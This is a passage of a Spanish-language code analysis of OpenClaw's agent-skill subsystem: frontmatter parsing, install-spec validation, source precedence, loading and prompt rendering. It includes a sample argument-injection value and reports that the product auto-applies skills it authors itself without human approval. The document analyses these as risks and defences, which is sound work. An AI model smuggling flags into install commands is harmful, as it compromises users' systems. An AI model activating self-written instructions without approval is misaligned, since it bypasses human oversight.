  }
  if (spec.kind === "go" && !spec.module) {
    return undefined;
  }
  if (spec.kind === "uv" && !spec.package) {
    return undefined;
  }
  if (spec.kind === "download" && !spec.url) {
    return undefined;
  }

  return spec;
}
```

**La lección de seguridad más transferible de todo el subsistema de frontmatter** está acá: cada campo que va a terminar en la línea de comandos de un gestor de paquetes se valida contra un patrón de allowlist, y explícitamente se rechaza:

- **Todo lo que empiece con `-`** → prevención de **argument injection** (que un `formula: "--build-from-source"` se cuele como flag del comando `brew`).
- **`\` y `..`** → prevención de path traversal.
- **`://`** en módulos Go y paquetes uv → evitar que un spec se convierta en una URL arbitraria.
- **Espacios** en URLs de descarga → evitar partir el comando.
- **Protocolos distintos de http/https** → evitar `file://`, `ftp://`, etc.

`kind` acepta tanto `kind` como `type` como nombre de campo (`parseOpenClawManifestInstallBase`), y normaliza a minúsculas:

```ts
export function parseOpenClawManifestInstallBase(
  input: unknown,
  allowedKinds: readonly string[],
): ParsedOpenClawManifestInstallBase | undefined {
  if (!input || typeof input !== "object") {
    return undefined;
  }
  const raw = input as Record<string, unknown>;
  const kindRaw =
    typeof raw.kind === "string" ? raw.kind : typeof raw.type === "string" ? raw.type : "";
  const kind = normalizeOptionalLowercaseString(kindRaw) ?? "";
  if (!allowedKinds.includes(kind)) {
    return undefined;
  }
  // …
}
```

**Comportamiento ante spec inválida**: se descarta esa entrada de `install`, pero **la skill sigue cargando**. `resolveOpenClawManifestInstall()` filtra los `undefined`:

```ts
/** Parses manifest install entries with a caller-owned parser and drops unsupported specs. */
export function resolveOpenClawManifestInstall<T>(
  metadataObj: Record<string, unknown>,
  parseInstallSpec: (input: unknown) => T | undefined,
): T[] {
  const installRaw = Array.isArray(metadataObj.install) ? (metadataObj.install as unknown[]) : [];
  return installRaw
    .map((entry) => parseInstallSpec(entry))
    .filter((entry): entry is T => Boolean(entry));
}
```

Consecuencia práctica: **una skill con `install` mal escrito no da error — simplemente el usuario no recibe la oferta de instalar la dependencia**, y la skill queda invisible por `requires` no satisfecho. Diagnóstico difícil. Está en la sección 7.

Preferencias del instalador (`src/skills/loading/config.ts`):

```ts
export type SkillsInstallPreferences = {
  preferBrew: boolean;
  nodeManager: "npm" | "pnpm" | "yarn" | "bun";
};

export function resolveSkillsInstallPreferences(config?: OpenClawConfig): SkillsInstallPreferences {
  const raw = config?.skills?.install;
  const preferBrew = raw?.preferBrew ?? true;
  const manager = normalizeLowercaseStringOrEmpty(normalizeOptionalString(raw?.nodeManager));
  const nodeManager: SkillsInstallPreferences["nodeManager"] =
    manager === "pnpm" || manager === "yarn" || manager === "bun" || manager === "npm"
      ? manager
      : "npm";
  return { preferBrew, nodeManager };
}
```

### 2.9. Validación y recuperación del parseo YAML

El parseo del frontmatter es sorprendentemente tolerante — hay un mecanismo de **doble intento con recuperación**. `packages/markdown-core/src/frontmatter.ts`:

```ts
function parseYamlFrontmatter(block: string): ParsedFrontmatterBlockResult {
  const fallback = parseLineFrontmatter(block);
  const parsed = parseYamlFrontmatterOnce(block, fallback);
  if (parsed.issues.length === 0) {
    return parsed;
  }
  const recoveredBlock = normalizeFreeformDescription(block);
  return recoveredBlock === block ? parsed : parseYamlFrontmatterOnce(recoveredBlock, fallback);
}
```

Y el punto de entrada, con los códigos de error posibles:

```ts
/** Parses frontmatter once while retaining recoverable YAML parser issues for owning loaders. */
export function parseFrontmatterBlockResult(content: string): ParsedFrontmatterBlockResult {
  const normalized = normalizeFrontmatterContent(content);
  const block = extractFrontmatterBlockFromNormalized(normalized)?.block;
  if (block !== undefined) {
    return block ? parseYamlFrontmatter(block) : { frontmatter: {}, issues: [] };
  }
  return FRONTMATTER_OPENING_DELIMITER.test(normalized)
    ? {
        frontmatter: {},
        issues: [
          {
            code: "UNTERMINATED_FRONTMATTER",
            message: "missing closing --- delimiter",
          },
        ],
      }
    : { frontmatter: {}, issues: [] };
}
```

Estrategia de tolerancia, en tres capas:

1. **Parser de líneas como red de contención** (`parseLineFrontmatter`): un regex `/^([\w-]+):\s*(.*)$/` línea por línea, que sirve de `fallback` si el parser YAML falla. Soporta valores multilínea indentados.
2. **Recuperación de `description` mal escapada** (`normalizeFreeformDescription`): el caso real más frecuente es una `description` con dos puntos sin comillas, que rompe YAML. La función la re-serializa con `JSON.stringify` y reintenta. Es una concesión pragmática a que la mayoría de las descripciones las escribe gente (o un LLM) sin pensar en YAML.
3. **Normalización de encoding**: BOM y CRLF se limpian antes de parsear.

```ts
function normalizeFrontmatterContent(content: string): string {
  return content
    .replace(/^﻿/, "")
    .replace(/\r\n/g, "\n")
    .replace(/\r/g, "\n");
}

const FRONTMATTER_CLOSING_DELIMITER = /(?:^|\n)---[^\S\n]*(?:\n|(?![\s\S]))/;
const FRONTMATTER_OPENING_DELIMITER = /^---[^\S\n]*\n/;
```

Códigos de error posibles: `UNTERMINATED_FRONTMATTER`, `INVALID_ROOT` (el frontmatter no es un mapping YAML), `YAML_EXCEPTION`, más los códigos nativos del parser `yaml`.

Y el consumidor en `frontmatter.ts` convierte el primer issue en excepción:

```ts
export function parseFrontmatter(content: string): ParsedSkillFrontmatter {
  const parsed = parseFrontmatterBlockResult(content);
  const issue = parsed.issues[0];
  if (issue) {
    throw new Error(`invalid frontmatter: ${issue.code}: ${issue.message}`);
  }
  return parsed.frontmatter;
}
```

Esa excepción sí se convierte en diagnóstico visible (a diferencia de la `description` faltante):

```ts
  let frontmatter: Record<string, string>;
  try {
    frontmatter = parseFrontmatter(raw);
  } catch (error) {
    const message = error instanceof Error ? error.message : "failed to parse skill frontmatter";
    params.onDiagnostic?.({ path: skillFilePath, message });
    return null;
  }
```

### 2.10. Ejemplos reales de `SKILL.md`

Cuatro ejemplos **transcritos literalmente** del directorio `skills/` de la raíz del repo, elegidos por cubrir el espectro de complejidad.

#### (a) Simple — solo `install`, sin gating: `skills/weather/SKILL.md`

```md
---
name: weather
description: "Current weather and forecasts with web_fetch, falling back to wttr.in curl for locations, rain, temperature, travel planning."
homepage: https://wttr.in/:help
metadata:
  {
    "openclaw":
      {
        "emoji": "☔",
        "install":
          [
            {
              "id": "brew",
              "kind": "brew",
              "formula": "curl",
              "bins": ["curl"],
              "label": "Install curl (brew)",
            },
          ],
      },
  }
---

# Weather

Use for current weather, rain/temperature checks, forecasts, and travel planning. Need a city, region, airport code, or coordinates.

## Preferred: web_fetch

Use `web_fetch` first when the tool is available. Request JSON because wttr.in
…
```

Nótese: **no declara `requires`**. La skill está siempre disponible; el `install` es solo una comodidad para que `curl` esté presente. Es la forma más liviana posible de una skill con metadata.

#### (b) Con `requires.bins` y gating por OS: `skills/peekaboo/SKILL.md`

```md
---
name: peekaboo
description: "Capture and automate macOS UI with the Peekaboo CLI."
homepage: https://peekaboo.boo
metadata:
  {
    "openclaw":
      {
        "emoji": "👀",
        "os": ["darwin"],
        "requires": { "bins": ["peekaboo"] },
        "install":
          [
            {
              "id": "brew",
              "kind": "brew",
              "formula": "steipete/tap/peekaboo",
              "bins": ["peekaboo"],
              "label": "Install Peekaboo (brew)",
            },
          ],
      },
  }
---

# Peekaboo

Peekaboo is a full macOS UI automation CLI: capture/inspect screens, target UI
elements, drive input, and manage apps/windows/menus. Commands share a snapshot
cache and support `--json`/`-j` for scripting. Run `peekaboo` or
…
```

Este es el patrón canónico: **`os` + `requires.bins` + `install` que provee justamente ese bin**. En Windows o Linux la skill es invisible; en macOS sin el binario, también invisible pero con receta de instalación disponible.

#### (c) Con `requires.bins` + `primaryEnv` + `user-invocable`: `skills/gh-issues/SKILL.md`

```md
---
name: gh-issues
description: "Fetch GitHub issues, select candidates, spawn background fix agents, open PRs, and optionally process PR review comments."
user-invocable: true
metadata:
  {
    "openclaw":
      {
        "requires": { "bins": ["git", "gh"] },
        "primaryEnv": "GH_TOKEN",
        "install":
          [
            {
              "id": "brew",
              "kind": "brew",
              "formula": "gh",
              "bins": ["gh"],
              "label": "Install GitHub CLI (brew)",
            },
          ],
      },
  }
---

# gh-issues

Use for issue-to-PR automation. Prefer `gh` CLI; fall back to `gh api` only when a high-level command lacks the needed field.

## Arguments
…
```

Ilustra `primaryEnv`: `GH_TOKEN` no está en `requires.env` (la skill carga sin él), pero al declararlo como `primaryEnv` el usuario puede configurar `skills.entries.gh-issues.apiKey` y ese valor cuenta como `GH_TOKEN`.

#### (d) Compleja — `requires.env` + `install` multi-plataforma con `download`: `skills/sherpa-onnx-tts/SKILL.md`

```md
---
name: sherpa-onnx-tts
description: "Local text-to-speech via sherpa-onnx (offline, no cloud)"
metadata:
  {
    "openclaw":
      {
        "emoji": "🔉",
        "os": ["darwin", "linux", "win32"],
        "requires": { "env": ["SHERPA_ONNX_RUNTIME_DIR", "SHERPA_ONNX_MODEL_DIR"] },
        "install":
          [
            {
              "id": "download-runtime-macos",
              "kind": "download",
              "os": ["darwin"],
              "url": "https://github.com/k2-fsa/sherpa-onnx/releases/download/v1.13.2/sherpa-onnx-v1.13.2-osx-universal2-shared.tar.bz2",
              "archive": "tar.bz2",
              "extract": true,
              "stripComponents": 1,
              "targetDir": "runtime",
              "label": "Download sherpa-onnx runtime (macOS)",
            },
            {
              "id": "download-runtime-linux-x64",
              "kind": "download",
              "os": ["linux"],
              "url": "https://github.com/k2-fsa/sherpa-onnx/releases/download/v1.13.2/sherpa-onnx-v1.13.2-linux-x64-shared.tar.bz2",
              "archive": "tar.bz2",
              "extract": true,
              "stripComponents": 1,
              "targetDir": "runtime",
              "label": "Download sherpa-onnx runtime (Linux x64)",
            },
            {
              "id": "download-runtime-win-x64",
              "kind": "download",
              "os": ["win32"],
              "url": "https://github.com/k2-fsa/sherpa-onnx/releases/download/v1.13.2/sherpa-onnx-v1.13.2-win-x64-shared-MD-Release.tar.bz2",
              "archive": "tar.bz2",
              "extract": true,
              "stripComponents": 1,
              "targetDir": "runtime",
              "label": "Download sherpa-onnx runtime (Windows x64)",
            },
            {
              "id": "download-model-lessac",
              "kind": "download",
              "url": "https://github.com/k2-fsa/sherpa-onnx/releases/download/tts-models/vits-piper-en_US-lessac-high.tar.bz2",
              "archive": "tar.bz2",
              "extract": true,
              "targetDir": "models",
              "label": "Download Piper en_US lessac (high)",
            },
          ],
      },
  }
---

# sherpa-onnx-tts
…
```

Éste muestra el **`os` a nivel de entrada de `install`** (distinto del `os` a nivel de skill): la skill corre en las tres plataformas, pero cada receta de descarga aplica solo a una. La última entrada (el modelo) no tiene `os` y aplica a todas. También muestra `archive` / `extract` / `stripComponents` / `targetDir` en uso real.

#### (e) Tool-dispatch — **no hay ejemplo real**

**[HALLAZGO NEGATIVO]** Ninguna de las 53 skills del repo usa `command-dispatch`. La única forma canónica del uso está en un test, `src/skills/loading/skills.test.ts`:

```ts
      frontmatterExtra: "command-dispatch: tool\ncommand-tool: sessions_send",
```

y en `src/skills/runtime/remote-skills.test.ts`, donde sí aparece un `SKILL.md` completo:

```ts
"---\nname: dispatch-skill\ndescription: Must run on its node\ncommand-dispatch: tool\ncommand-tool: exec\n---\n",
```

Reconstruido como archivo, un SKILL.md con tool-dispatch se vería así:

```md
---
name: dispatch-skill
description: Must run on its node
command-dispatch: tool
command-tool: exec
---
```

Con `command-arg-mode: raw` implícito.

### 2.11. Cómo se rinde el frontmatter al modelo

Solo tres campos del frontmatter llegan al prompt del modelo: `name`, `description` y una `version` derivada del hash del contenido. **Transcripción literal** de `src/skills/loading/skill-contract.ts`:

```ts
export interface Skill {
  name: string;
  description: string;
  /** Additional loading guidance rendered with the location in full and compact catalogs. */
  locationNote?: string;
  /** Runtime-only content for non-filesystem skill locators such as node://. */
  readContent?: string;
  filePath: string;
  baseDir: string;
  /** Deterministic marker for the SKILL.md content rendered as <version>. */
  promptVersion?: string;
  sourceInfo: SourceInfo;
  disableModelInvocation: boolean;
  // Preserve legacy source reads while keeping the canonical upstream shape.
  source: string;
}

/**
 * Keep this formatter's XML layout byte-for-byte aligned with the upstream
 * Agent Skills formatter so we can avoid importing the full session runtime
 * package root on the cold skills path. Visibility policy is applied upstream
 * before calling this helper.
 */
export function formatSkillsForPrompt(skills: Skill[]): string {
  if (skills.length === 0) {
    return "";
  }
  const lines = [
    "\n\nThe following skills provide specialized instructions for specific tasks.",
    "Use the read tool to load a skill's file when the task matches its description.",
    "If a skill's <version> differs from a previous turn, re-read its SKILL.md before using it.",
    "When a skill file references a relative path, resolve it against the skill directory (parent of SKILL.md / dirname of the path) and use that absolute path in tool commands.",
    "",
    "<available_skills>",
  ];
  for (const skill of skills) {
    lines.push("  <skill>");
    lines.push(`    <name>${escapeXml(skill.name)}</name>`);
    lines.push(`    <description>${escapeXml(skill.description)}</description>`);
    lines.push(`    <location>${escapeXml(skill.filePath)}</location>`);
    if (skill.locationNote) {
      lines.push(`    <location_note>${escapeXml(skill.locationNote)}</location_note>`);
    }
    if (skill.promptVersion) {
      lines.push(`    <version>${escapeXml(skill.promptVersion)}</version>`);
    }
    lines.push("  </skill>");
  }
  lines.push("</available_skills>");
  return lines.join("\n");
}
```

**Ésta es la diferencia arquitectónica más importante entre OpenClaw y O.R.I.O.N.**, y conviene tenerla presente al leer la sección 8:

> En OpenClaw, **el cuerpo del `SKILL.md` no se carga hasta que hace falta**. El prompt solo lleva `name` + `description` + `location` + `version`. El modelo decide leer el archivo con la herramienta `read` cuando la tarea matchea la descripción. Es **carga perezosa (lazy loading) dirigida por el propio modelo**.
>
> En O.R.I.O.N., el matching es **anticipado y determinista**: un clasificador TF-IDF+SVM entrenado con `get_training_data()` decide qué skill ejecutar antes de invocar ningún LLM.

Son dos filosofías opuestas: OpenClaw delega el enrutamiento al modelo y paga tokens por ello; O.R.I.O.N. lo resuelve con ML clásico local, barato y predecible. **La `description` en OpenClaw cumple exactamente el rol que en O.R.I.O.N. cumple `get_training_data()`.** Eso es clave para la sección 8.

El `<version>` es un hash determinista del contenido (`computeSkillPromptVersion(raw)`), y su propósito está explicado en el propio prompt: *"If a skill's `<version>` differs from a previous turn, re-read its SKILL.md before using it"* — es un mecanismo de invalidación de caché dirigido al modelo, para soportar hot-reload de skills en medio de una conversación.

---

## 3. Ciclo de vida de un skill

### 3.1. Las seis fuentes y su precedencia

**[VERIFICADO EN CÓDIGO]** OpenClaw carga skills desde seis orígenes distintos y los fusiona en un único mapa **indexado por `skill.name`**. El orden de fusión define la precedencia: **el último en escribir gana**.

**Transcripción literal** del bloque de merge, `src/skills/loading/workspace.ts`:

```ts
  const merged = new Map<string, LoadedSkillRecord>();
  const archivedSkillFiles = opts?.includeArchived ? null : getArchivedSkillFiles();
  const mergeRecord = (record: LoadedSkillRecord) => {
    if (archivedSkillFiles?.has(canonicalizePath(record.skill.filePath))) {
      return;
    }
    merged.set(record.skill.name, record);
  };
  // Precedence: extra < bundled < managed < agents-skills-personal < agents-skills-project < workspace
  for (const record of extraSkills) {
    mergeRecord(record);
  }
  for (const record of bundledSkills) {
    mergeRecord(record);
  }
  for (const record of managedSkills) {
    mergeRecord(record);
  }
  for (const record of personalAgentsSkills) {
    mergeRecord(record);
  }
  for (const record of projectAgentsSkills) {
    mergeRecord(record);
  }
  for (const record of workspaceSkills) {
    mergeRecord(record);
  }
```

La tabla de precedencia, de menor a mayor autoridad:

| # | `source` | Directorio | Qué es |
|---|---|---|---|
| 1 | `openclaw-extra` | `config.skills.load.extraDirs` + `~/.config/openclaw/plugin-skills` | Directorios extra configurados y skills aportadas por plugins |
| 2 | `openclaw-bundled` | `resolveBundledSkillsDir()` | Las 53 skills que vienen con el producto |
| 3 | `openclaw-managed` | directorio gestionado | Skills instaladas vía ClawHub / instalador |
| 4 | `agents-skills-personal` | `~/.agents/skills` | Skills personales del usuario, estándar cross-agente |
| 5 | `agents-skills-project` | `<workspace>/.agents/skills` | Skills del proyecto, estándar cross-agente |
| 6 | `openclaw-workspace` | `<workspace>/skills` | Skills del workspace — **máxima autoridad** |

Consecuencias de diseño, importantes:

- **La colisión se resuelve por nombre, silenciosamente.** Si el usuario crea `<workspace>/skills/weather/SKILL.md`, **reemplaza por completo** la skill `weather` que viene con el producto. No hay merge de campos, no hay advertencia. Es un override total.
- **Los plugins tienen la precedencia más baja**, junto con los `extraDirs`. Un plugin no puede pisar una skill bundled. Decisión defensiva sensata.
- **Las skills auto-capturadas** (sección 4) se escriben en el workspace o en `.agents/skills`, es decir, en los niveles 5–6. Por lo tanto **una skill auto-generada puede pisar una skill bundled del producto** si acierta el nombre. Combinado con la auto-aplicación por defecto, esto es un riesgo real; está en la sección 7.
- Existe además una lista de **archivadas** (`getArchivedSkillFiles()`) que actúa como filtro previo al merge: una skill archivada no entra al mapa aunque exista en disco.
- El resultado final se **ordena alfabéticamente** por nombre (`localeCompare(a, b, "en")`) para que el prompt sea determinista.

Hay un par de gates de contexto adicionales visibles en el código: `workspaceOnly` desactiva todas las fuentes salvo `openclaw-workspace` (modo aislado), e `isDefaultStateDir()` condiciona la carga de las skills personales — si el directorio de estado no es el default, las skills personales del usuario no se cargan.

### 3.2. Descubrimiento: dos formas de directorio

**[VERIFICADO EN CÓDIGO]** — `src/skills/loading/local-loader.ts`, función `loadSkillsFromDirSafe()`. El cargador acepta **dos layouts** y los distingue por prueba:

```ts
/** Loads skills from a local directory while turning read/parse failures into diagnostics. */
export function loadSkillsFromDirSafe(params: {
  dir: string;
  source: string;
  maxBytes?: number;
  onDiagnostic?: (diagnostic: LocalSkillLoadDiagnostic) => void;
}): {
  skills: Skill[];
  frontmatterByFilePath: ReadonlyMap<string, ParsedSkillFrontmatter>;
} {
  const rootDir = path.resolve(params.dir);
  let rootRealPath: string;
  try {
    rootRealPath = fs.realpathSync(rootDir);
  } catch {
    return { skills: [], frontmatterByFilePath: new Map() };
  }

  const rootSkill = loadSingleSkillDirectory({
    skillDir: rootDir,
    source: params.source,
    rootRealPath,
    maxBytes: params.maxBytes,
    onDiagnostic: params.onDiagnostic,
  });
  if (rootSkill) {
    return {
      skills: [rootSkill.skill],
      frontmatterByFilePath: new Map([[rootSkill.skill.filePath, rootSkill.frontmatter]]),
    };
  }

  const loadedSkills = listCandidateSkillDirs(rootDir)
    .map((skillDir) =>
      loadSingleSkillDirectory({
        skillDir,
        source: params.source,
        rootRealPath,
        maxBytes: params.maxBytes,
        onDiagnostic: params.onDiagnostic,
      }),
    )
    .filter((skill): skill is LoadedLocalSkill => skill !== null);
  const frontmatterByFilePath = new Map<string, ParsedSkillFrontmatter>();
  for (const loaded of loadedSkills) {
    frontmatterByFilePath.set(loaded.skill.filePath, loaded.frontmatter);
  }

  return {
    skills: loadedSkills.map((loaded) => loaded.skill),
    frontmatterByFilePath,
  };
}
```

La lógica: **primero prueba si el directorio *es* una skill** (contiene `SKILL.md` directamente). Si lo es, devuelve esa única skill. Si no, **trata el directorio como contenedor** y escanea sus subdirectorios.

El escaneo de candidatos, con sus exclusiones:

```ts
function listCandidateSkillDirs(dir: string): string[] {
  try {
    return fs
      .readdirSync(dir, { withFileTypes: true })
      .filter(
        (entry) =>
          entry.isDirectory() && !entry.name.startsWith(".") && entry.name !== "node_modules",
      )
      .map((entry) => path.join(dir, entry.name))
      .toSorted((left, right) => left.localeCompare(right));
  } catch {
    return [];
  }
}
```

Puntos verificados: **el escaneo es de un solo nivel, no recursivo**; se excluyen directorios ocultos (`.`) y `node_modules`; y se ordena para que el resultado sea determinista.

### 3.3. Lectura con frontera de seguridad anti-symlink

Un detalle notable: la lectura del `SKILL.md` **no** usa `fs.readFileSync` directo, sino un helper de frontera que garantiza que un symlink no pueda escapar del directorio raíz de skills.

```ts
// Read SKILL.md through the root boundary helper so symlinks cannot escape the skill root.
function readSkillFileSync(params: {
  rootRealPath: string;
  filePath: string;
  maxBytes?: number;
}): string | null {
  const opened = openRootFileSync({
    absolutePath: params.filePath,
    rootPath: params.rootRealPath,
    rootRealPath: params.rootRealPath,
    boundaryLabel: "skill root",
    maxBytes: params.maxBytes,
  });
  if (!opened.ok) {
    return null;
  }
  try {
    return fs.readFileSync(opened.fd, "utf8");
  } finally {
    fs.closeSync(opened.fd);
  }
}
```

Nótese: la raíz se resuelve con `fs.realpathSync()` **antes** de comparar, se abre por descriptor de archivo (`fd`) y hay un tope de bytes (`maxBytes`). Es el mismo patrón de doble pasada anti-symlink documentado en el análisis hermano de seguridad.

### 3.4. Las cinco fases del ciclo de vida

```
┌─ 1. DESCUBRIMIENTO ────────────────────────────────────────────┐
│  6 fuentes × loadSkillsFromDirSafe()                          │
│  · realpath del root, apertura por fd, tope de bytes          │
│  · un nivel de profundidad, sin ocultos ni node_modules       │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌─ 2. PARSEO Y VALIDACIÓN ───────────────────────────────────────┐
│  parseFrontmatter()  → YAML con doble intento + recuperación   │
│    · falla de parseo    → diagnóstico + descarte              │
│  name = frontmatter.name || basename(dir)                      │
│  description requerida  → si falta, descarte SILENCIOSO        │
│  resolveOpenClawMetadata()      → bloque JSON5 metadata.openclaw│
│  resolveSkillInvocationPolicy() → user-invocable / disable-…    │
│  computeSkillPromptVersion(raw) → hash para <version>          │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌─ 3. FUSIÓN Y PRECEDENCIA ──────────────────────────────────────┐
│  Map<name, record>, último gana                                │
│  extra < bundled < managed < personal < project < workspace    │
│  filtro de archivadas · orden alfabético final                 │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌─ 4. ELEGIBILIDAD (shouldIncludeSkill) ─────────────────────────┐
│  a) skillConfig.enabled === false        → fuera               │
│  b) secreto de la skill degradado        → fuera               │
│  c) no está en allowBundled              → fuera               │
│  d) evaluateRuntimeEligibility():                              │
│       os no matchea (ni remoto)          → fuera  [gate duro]  │
│       always === true                    → DENTRO (bypass)     │
│       requires.bins / anyBins / env / config no satisfechos    │
│                                          → fuera [silencioso]  │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌─ 5. EXPOSICIÓN ────────────────────────────────────────────────┐
│  includeInRuntimeRegistry: true                                │
│  includeInAvailableSkillsPrompt: !disableModelInvocation       │
│  userInvocable: user-invocable ?? true                         │
│    ├─ prompt <available_skills>  (name+description+loc+version)│
│    └─ comando slash /nombre  (+ dispatch opcional a tool)      │
└────────────────────────────────────────────────────────────────┘
```

**Transcripción literal** de la construcción de la entrada final, con su bloque de exposición, `src/skills/loading/workspace.ts`:

```ts
      const invocation = resolveSkillInvocationPolicy(frontmatter);
      const entry: SkillEntry = {
        skill,
        frontmatter,
        metadata: resolveSkillEntryMetadata({ frontmatter, skillDir: skill.baseDir }),
        invocation,
        exposure: {
          includeInRuntimeRegistry: true,
          // Freshly loaded entries preserve the documented disable-model-invocation
          // contract, while legacy entries without exposure metadata still use
          // the centralized prompt visibility fallback.
          includeInAvailableSkillsPrompt: !invocation.disableModelInvocation,
          userInvocable: invocation.userInvocable ?? true,
        },
      };
```

Con el tipo completo de la entrada (`src/skills/types.ts`):

```ts
type SkillExposure = {
  includeInRuntimeRegistry: boolean;
  includeInAvailableSkillsPrompt: boolean;
  userInvocable: boolean;
};

export type SkillEntry = {
  skill: Skill;
  frontmatter: ParsedSkillFrontmatter;
  metadata?: OpenClawSkillMetadata;
  invocation?: SkillInvocationPolicy;
  exposure?: SkillExposure;
  syncSourceDir?: string;
  syncDirName?: string;
  disableCommandDispatch?: boolean;
};
```

**Tres superficies de exposición independientes**: registro de runtime, prompt del modelo, comando de usuario. Una skill puede estar en unas y no en otras. Esta separación es más fina que la de O.R.I.O.N. hoy, donde una skill registrada es automáticamente invocable por todas las vías.

### 3.5. Activación: nombres de comando

Al construir el comando slash (`src/skills/discovery/command-specs.ts`), hay dos transformaciones con traza:

```ts
    const rawName = entry.skill.name;
    const base = sanitizeSkillCommandName(rawName);
    if (base !== rawName) {
      traceSkillCommandOnce(
        `sanitize:${rawName}:${base}`,
        `Sanitized skill command name "${rawName}" to "/${base}".`,
        { rawName, sanitized: `/${base}` },
      );
    }
    const unique = resolveUniqueSkillCommandName(base, used);
    if (unique !== base) {
      traceSkillCommandOnce(
        `dedupe:${rawName}:${unique}`,
        `De-duplicated skill command name for "${rawName}" to "/${unique}".`,
        { rawName, deduped: `/${unique}` },
      );
    }
    used.add(normalizeLowercaseStringOrEmpty(unique));
    const description = entry.skill.description?.trim() || rawName;
```

1. **Saneamiento**: el nombre se convierte en un identificador de comando válido.
2. **Deduplicación**: si dos skills producen el mismo nombre de comando, la segunda recibe un sufijo. Nótese que esto ocurre **después** del merge por precedencia, así que solo aplica a nombres que *sanean* al mismo valor sin ser idénticos.
3. Hay además un conjunto de `reservedNames` que se pre-cargan en `used` para que las skills no pisen comandos del sistema.

Detalle menor pero revelador: `const description = entry.skill.description?.trim() || rawName;` — si la descripción quedara vacía, se usa el nombre. Es un fallback defensivo redundante, porque una skill sin descripción ya fue descartada en la fase 2.

### 3.6. El snapshot de sesión y el versionado del prompt

**[VERIFICADO EN CÓDIGO]** El conjunto de skills resuelto se congela en un *snapshot* por sesión, con versión de formato. `src/skills/types.ts`:

```ts
export const WORKSPACE_SKILLS_PROMPT_FORMAT_VERSION = 3;

export type SkillSnapshot = {
  prompt: string;
  skills: Array<{
    name: string;
    /** Config key can differ from the prompt-facing skill name. */
    skillKey?: string;
    primaryEnv?: string;
    requiredEnv?: string[];
  }>;
  /** Normalized agent-level filter used to build this snapshot; undefined means unrestricted. */
  skillFilter?: string[];
  /** Sparse per-session overlay applied after the agent-level filter. */
  skillOverrides?: Record<string, boolean>;
  /** Effective node-exec eligibility used to select connected node-hosted skills. */
  nodeSkillsEligibility?: SkillEligibilityContext["nodeSkills"];
  resolvedSkills?: Skill[];
  version?: number;
  promptFormatVersion?: number;
};
```

Y el contexto de elegibilidad que permite contar capacidades remotas:

```ts
export type SkillEligibilityContext = {
  nodeSkills?: {
    canExec: boolean;
    node?: string;
  };
  remote?: {
    platforms: string[];
    hasBin: (bin: string) => boolean;
    hasAnyBin: (bins: string[]) => boolean;
    note?: string;
  };
};
```

El snapshot tiene **dos capas de filtrado superpuestas**: un `skillFilter` a nivel de agente (allowlist normalizada; `undefined` = sin restricción) y un `skillOverrides` disperso por sesión que se aplica **después**. Eso permite que una sesión concreta habilite o deshabilite una skill puntual sin tocar la config del agente.

El `promptFormatVersion` sirve para invalidar snapshots cacheados cuando cambia el formato del prompt entre versiones del producto.

### 3.7. Instalación y hot-reload

El módulo `src/skills/lifecycle/` (35 archivos) cubre la instalación desde fuentes remotas. Los mecanismos identificados:

- **`clawhub-*.ts`** — instalación desde ClawHub, el registro de skills de OpenClaw, con `clawhub-verdicts.ts` en `security/` para dictámenes de seguridad del registro.
- **`install-download.ts` / `install-extract.ts` / `archive-install.ts`** — descarga y extracción de los specs `kind: "download"`, incluyendo `stripComponents` y `targetDir`.
- **`source-install.ts` / `upload-install.ts`** — instalación desde repositorio fuente y desde archivo subido.
- **`skill-change-hook.ts` + `skill-tree-digest.ts`** — detección de cambios por digest del árbol de skills; es el mecanismo de **hot-reload**.
- **`workspace-skill-write.ts`** — la única puerta de escritura de un `SKILL.md` en el workspace; es la que usa el workshop al aplicar una propuesta.

El hot-reload en el lado del modelo se resuelve con el `<version>` del prompt, ya citado en 2.11: *"If a skill's `<version>` differs from a previous turn, re-read its SKILL.md before using it."* Es decir, OpenClaw **no reinicia nada**: cambia el hash en el prompt y le indica al modelo que su copia está vieja.

### 3.8. Qué NO tiene el ciclo de vida

**[HALLAZGOS NEGATIVOS]** — busqué explícitamente y no encontré:

- **No hay versionado semántico de skills.** `skill-version.ts` calcula un hash de contenido para invalidación de caché, no una versión declarada por el autor. No se puede pedir "weather >= 2.0".
- **No hay dependencias entre skills.** `requires` cubre binarios, variables de entorno y paths de config, pero **no otras skills**. No existe `requires.skills`.
- **No hay orden de carga ni inicialización.** Las skills son archivos Markdown; no tienen código que corra al cargar, así que no hace falta.
- **No hay desinstalación en caliente más allá del archivado.** `getArchivedSkillFiles()` es el mecanismo de "apagado suave".
- **No hay validación de que `name` sea un slug válido en el momento de carga** (ver 2.2).

---

## 4. Auto-autoría y autocaptura de skills

Esta es la sección central del análisis. Es también la más sorprendente.

### 4.0. La respuesta corta

> **¿OpenClaw auto-aplica las skills que se autogenera, o pide aprobación humana?**
>
> **[VERIFICADO EN CÓDIGO] AUTO-APLICA. Por defecto. Sin aprobación humana. A partir de una sola frase del usuario, sin ningún umbral de repetición.**

Las tres afirmaciones se sostienen por separado, con evidencia transcrita más abajo:

1. El default de configuración es `autonomous.mode: "auto"` y `approvalPolicy: "auto"` (`workshop/config.ts`).
2. El disparador es **un único mensaje del usuario** que matchee una de 17 expresiones regulares. **No hay contador de repeticiones, no hay umbral de frecuencia, no hay ventana temporal.** El test se llama literalmente *"auto-applies deterministic capture by default"* y pasa un solo mensaje.
3. La única barrera real entre "el usuario dijo una frase" y "hay un archivo `SKILL.md` nuevo y activo en el workspace" es un **escáner de patrones peligrosos por regex**, que si encuentra algo `critical` pone la propuesta en cuarentena en vez de aplicarla.

Esto es exactamente lo contrario de lo que el usuario quiere para O.R.I.O.N., y por eso el diferenciador que pide (ver sección 9, REQ-013) está bien fundado: **es una decisión de diseño deliberadamente distinta, no una copia con retraso**.

### 4.1. Corrección de la premisa: `research/` y `workshop/` son dos mitades

Ya anticipado en la sección 0. La división de responsabilidades real es:

| Carpeta | Archivos | Rol |
|---|---|---|
| `src/skills/research/` | 6 (3 productivos: `autocapture.ts`, `signals.ts`, `text.ts`) | **Detección**: extraer de la transcripción de la sesión las frases que parecen instrucciones duraderas, agruparlas y decidir a qué skill pertenecen. |
| `src/skills/workshop/` | 60 | **Gobernanza**: propuestas, ciclo de vida, política de aprobación, escaneo de seguridad, store SQLite con rollback, hooks de evaluación por plugin, cuarentena. |

El punto de unión es `research/autocapture.ts`, que importa de `workshop/` (`auto-apply.js`, `config.js`, `service.js`, `store.js`, `frontmatter.js`).

